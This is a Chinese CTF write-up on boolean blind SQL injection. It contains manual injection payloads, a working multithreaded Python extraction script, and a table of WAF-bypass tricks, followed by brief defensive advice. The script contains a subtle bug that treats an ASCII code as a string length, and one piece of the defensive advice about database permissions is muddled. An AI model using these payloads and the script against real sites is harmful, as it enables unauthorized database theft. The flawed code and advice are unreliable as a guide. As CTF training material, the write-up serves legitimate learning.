Web SQL注入 盲注 Python

CTFshow Web 入门：布尔盲注从手搓到脚本

2026-10-18 · 约 12 分钟 · CTFshow

页面不回显数据、不回显报错，只有「登录成功」和「用户名不存在」两句话。 这篇记录我怎么从手工测 length()，到写出一把梭的多线程脚本，以及中途被过滤掉的几个函数是怎么绕的。

这是一篇示例文章，用来演示正文排版（表格、代码块、提示框、目录）。写自己的 writeup 时，把这段提示删掉、内容替换即可。

题目信息

平台CTFshow · Web 入门
类型SQL 注入 / 布尔盲注
入口?id=1 查询接口
目标从数据库里取出 flag

盲注是很多人入门 SQL 注入时最烦的一种：明明注进去了，但页面上什么都没变。 其实它只是把「读数据」变成了「问是非题」—— 你只能问「第 1 个字符的 ASCII 码是不是大于 100」， 然后根据页面的一点点差异判断答案是真是假。

第一步：确认页面行为

正常访问 ?id=1 返回一篇文章，换成 ?id=1' 页面依然是正常的文章，没有报错。

这时先做三个试探，判断注入类型：

# 1. 逻辑判断：真 / 假 是否回显不同
?id=1 and 1=1
?id=1 and 1=2

# 2. 字符串拼接是否生效
?id=1' and '1'='1
?id=1' and '1'='2

# 3. 是否有时间盲注（无回显差异时）
?id=1' and sleep(3)-- -

结果是第 1 组的两个请求回显不同：and 1=1 有内容，and 1=2 没内容。 说明这是基于布尔的盲注，而且参数是数值型（不需要闭合引号就能生效）。

第二步：先量一下长度

从库名开始，先确定长度，再逐位猜字符，能把请求数从「256 次」压到「7 × 长度 次」。

?id=1 and length(database())=8-- -
?id=1 and length(database())=9-- -

当 =8 时页面正常，=9 时为空，说明库名长度是 8。用同样的方法可以量出表名、字段名和 flag 的长度。

第三步：逐位爆破字符

关键是 substr() 配合 ascii()：一次比较一个字符的编码。手搓几条确认能跑通：

?id=1 and ascii(substr(database(),1,1))>100-- -
?id=1 and ascii(substr(database(),1,1))=99-- -

第 1 个字符是 99，也就是小写 c。 手工这样一位位试肯定不现实，直接写脚本。

第四步：多线程盲注脚本

核心思路：先二分法确定每一位的 ASCII，再按位置并发跑，最后拼起来。用 concurrent.futures 就够了，不用装额外的库。

import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://target/index.php"
TRUE_HINT = "文章"          # 页面为真时的特征字符串
HEADERS = {"User-Agent": "Mozilla/5.0"}

def cond(payload: str) -> bool:
    """发出一次请求，判断布尔条件是否为真。"""
    r = requests.get(URL, params={"id": payload}, headers=HEADERS, timeout=5)
    return TRUE_HINT in r.text

def bisect_char(expr: str, pos: int, lo: int = 32, hi: int = 128) -> int:
    """二分法猜出 expr 第 pos 位的字符编码。"""
    while lo < hi:
        mid = (lo + hi) // 2
        if cond(f"1 and ascii(substr(({expr}),{pos},1))>{mid}-- -"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def dump(expr: str, length: int) -> str:
    """并发爆破整段字符串。"""
    with ThreadPoolExecutor(max_workers=8) as pool:
        codes = list(pool.map(lambda p: bisect_char(expr, p), range(1, length + 1)))
    return "".join(chr(c) for c in codes)

if __name__ == "__main__":
    db = dump("database()", 8)
    print("[+] 库名:", db)

    tables_len = bisect_char(
        "select group_concat(table_name) from information_schema.tables "
        f"where table_schema='{db}'", 1
    )
    tables = dump(
        "select group_concat(table_name) from information_schema.tables "
        f"where table_schema='{db}'", tables_len
    )
    print("[+] 表名:", tables)

跑一轮大概 20 秒，库名、表名、字段名就都出来了。 最后把 expr 换成具体字段，比如 select flag from flag，就能拿到目标。

踩坑：那些被过滤掉的写法

这题的 WAF 比我预想的严格，中途换了三次写法才跑通：

被拦的写法替换方案
substr()用 mid() 或 substring()，甚至 left(right()) 嵌套
空格用 /**/ 或 %09（Tab）、%0a（换行）
=用 < / > 二分，反正本来就要二分
information_schema5.7+ 用 sys.schema_table_statistics，或直接猜常见表名

还有一个细节：-- - 后面的空格必须保留，很多 WAF 会拦 -- 但放过 -- - 或者 #。 我把注释符做成命令行参数，哪种能用就换哪种，省得反复改代码。

复盘

这题本身不难，但它把我之前很多「知道概念但没实操」的点串起来了：

  • 布尔盲注的本质是「用响应的差异构造一个 bit 通道」，二分法是最省请求数的问法。
  • 先量长度再逐位猜，能少一半以上的无效请求。
  • 写脚本时把 payload 生成和请求发送分开，被 WAF 拦了只改生成函数，不用动整体逻辑。

如果我是防守方

  • 参数化查询（Prepared Statement），从根上断掉拼接。
  • 对数据库账号做最小权限，Web 用户不该有 information_schema 之外任何库的读权限。
  • 布尔盲注很难靠关键字拦干净，更有效的是限制单 IP 请求频率 + 对异常参数做类型强校验。
